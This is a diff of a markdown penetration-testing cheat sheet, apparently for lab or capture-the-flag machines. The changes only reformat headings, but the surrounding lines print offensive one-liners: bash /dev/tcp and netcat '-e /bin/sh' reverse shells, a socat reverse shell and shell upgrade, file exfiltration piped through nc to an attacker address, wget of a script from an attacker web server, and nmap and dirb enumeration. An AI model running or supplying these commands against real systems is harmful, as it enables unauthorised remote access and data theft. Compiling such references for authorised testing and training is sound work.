@@ -8,7 +8,7 @@
 
 ### Create web server
 
-#### With Python
+* #### With Python
 
 ```
 python3 -m http.server 8888
@@ -20,7 +20,7 @@ python -m SimpleHTTPServer 8888
 
 ### Upgrade reverse shell
 
-#### With Socat
+* #### With Socat
 
 *Victim:* 
 ```
@@ -34,7 +34,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
 
-#### With Python
+* #### With Python
 
 *Victim:* 
 ```
@@ -43,7 +43,7 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 ### Send files
 
-#### With netcat
+* #### With netcat
 
 *Victim:*
 ```
@@ -55,7 +55,7 @@ cat file.txt | nc -q 0 10.10.10.10 4444
 nc -lvp 4444 > file.txt
 ```
 
-#### With web server
+* #### With web server
 
 *Kali:*
 ```
@@ -73,19 +73,19 @@ wget http://10.10.10.10:8888/something.sh -O something.sh
 
 ### Reverse shells
 
-#### With bash
+* #### With bash
 
 ```
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
-#### With netcat
+* #### With netcat
 
 ```
 nc -e /bin/sh 10.10.10.10 4444
 ```
 
-#### Listener
+* #### Listener
 
 ```
 nc -lvp 4444
@@ -93,7 +93,7 @@ nc -lvp 4444
 
 ## Enumeration
 
-#### Nmap
+* #### Nmap
 
 TCP Scan:
 
@@ -109,7 +109,7 @@ nmap -sU -sV -p- 10.10.10.77
 
 ### If Web Server
 
-#### dirb
+* #### dirb
 
 Quick directory busting
 
@@ -117,7 +117,7 @@ Quick directory busting
 dirb http://10.10.10.77/
 ```
 
-#### FuFF
+* #### FuFF
 
 VHOST Discovery
 
